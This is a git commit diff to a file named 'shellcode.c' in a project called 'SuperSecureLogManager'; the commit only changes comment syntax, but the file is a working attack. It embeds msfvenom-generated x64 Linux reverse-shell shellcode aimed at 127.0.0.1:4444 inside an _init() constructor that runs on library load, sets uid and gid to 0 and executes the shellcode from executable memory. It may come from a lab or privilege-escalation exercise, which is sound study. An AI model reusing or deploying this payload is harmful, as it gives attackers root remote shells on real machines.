52d40f29b85f7bfc1d97bb85f403cb89e30d2021
rjm-darkrelay <116993569+rjm-darkrelay@users.noreply.github.com>
2025-01-17 09:58:00 +0530

    Update shellcode.c

--- SuperSecureLogManager/shellcode.c
+++ SuperSecureLogManager/shellcode.c
@@ -4,8 +4,8 @@
 #include <sys/mman.h>
 #include <unistd.h>
 
-# TCP Reverse Shell on 127.0.0.1:4444 - Created using msfvenom (x64)
-# msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
+// TCP Reverse Shell on 127.0.0.1:4444 - Created using msfvenom (x64)
+// msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
 unsigned char shellcode[] = 
 "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
 "\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6"
@@ -15,11 +15,11 @@ unsigned char shellcode[] =
 "\x89\xe6\x0f\x05";
 
 void _init() {
-	# Manually Esclalating the privileges
+    // Manually Esclalating the privileges
     setuid(0);
     setgid(0);
 	
-	# Executing the shellcode
+    // Executing the shellcode
     void *exec = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
     memcpy(exec, shellcode, sizeof(shellcode));
     ((void (*)())exec)();
